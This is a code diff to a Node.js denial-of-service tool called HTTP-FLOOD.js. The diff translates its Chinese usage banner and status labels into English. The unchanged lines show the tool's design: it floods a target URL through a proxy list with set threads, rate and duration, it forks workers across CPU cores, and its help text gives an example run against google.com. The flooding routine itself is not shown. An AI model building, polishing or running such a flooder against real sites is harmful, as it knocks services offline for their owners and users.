@@ -46,16 +46,16 @@ if (process.argv.length < 7) {
     console.log(`
     ${`${'HTTP1 v2.0 Flood'.underline}`.italic}
 
-    ${'方法:'.bold.underline}
+    ${'example:'.bold.underline}
 
-        ${`node HTTP-FLOOD.js ${'['.red.bold}目标${']'.red.bold} ${'['.red.bold}时间${']'.red.bold} ${'['.red.bold}线程${']'.red.bold} ${'['.red.bold}速率${']'.red.bold} ${'['.red.bold}代理${']'.red.bold} ${'('.red.bold}选项${')'.red.bold}`.italic}
+        ${`node HTTP-FLOOD.js ${'['.red.bold}TARGET${']'.red.bold} ${'['.red.bold}TIME${']'.red.bold} ${'['.red.bold}THREAD${']'.red.bold} ${'['.red.bold}RATE${']'.red.bold} ${'['.red.bold}AGENT FILE${']'.red.bold} ${'('.red.bold}PROXY${')'.red.bold}`.italic}
         ${'node HTTP-FLOOD.js https://google.com 300 5 90 proxy.txt --debug true'.italic}
 
-    ${'选项:'.bold.underline}
+    ${'options:'.bold.underline}
 
-        --debug         ${'true'.green}        ${'-'.red.bold}   ${`调试级别响应代码`.italic}
-        --filter        ${'true'.green}        ${'-'.red.bold}   ${'从列表中删除无响应的代理'.italic}
-        --tls           ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`TLS最大版本 [1: ${'TLSv1'.underline}], [2: ${'TLSv2'.underline}], [3: ${'TLSv3'.underline}]`.italic}
+        --debug         ${'true'.green}        ${'-'.red.bold}   ${`Debug Level Response Codes`.italic}
+        --filter        ${'true'.green}        ${'-'.red.bold}   ${'Remove unresponsive agents from the list'.italic}
+        --tls           ${'1'.yellow}/${'2'.yellow}/${'3'.yellow}       ${'-'.red.bold}   ${`TLS Maximum version [1: ${'TLSv1'.underline}], [2: ${'TLSv2'.underline}], [3: ${'TLSv3'.underline}]`.italic}
     `);
     process.exit(0)
 };
@@ -291,12 +291,12 @@ if (cluster.isMaster) {
 
     console.clear();
     console.log(`
-            ${'方法'.bold}      ${'-'.red}   ${'['.red} ${`HTTP-FLOOD`.italic} ${']'.red} 
-            ${'目标'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
-            ${'时间'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
-            ${'线程'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
-            ${'速率'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
-            ${'选项'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);
+            ${'method'.bold}      ${'-'.red}   ${'['.red} ${`HTTP-FLOOD`.italic} ${']'.red} 
+            ${'url'.bold}      ${'-'.red}   ${'['.red} ${`${target}`.italic} ${']'.red} 
+            ${'time'.bold}        ${'-'.red}   ${'['.red} ${`${duration}`.italic} ${']'.red} 
+            ${'threads'.bold}     ${'-'.red}   ${'['.red} ${`${threads}`.italic} ${']'.red} 
+            ${'rate'.bold}        ${'-'.red}   ${'['.red} ${`${rate}`.italic} ${']'.red}
+            ${'options'.bold}     ${'-'.red}   ${'['.red} ${`${_options}`.italic} ${']'.red}`);
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
 
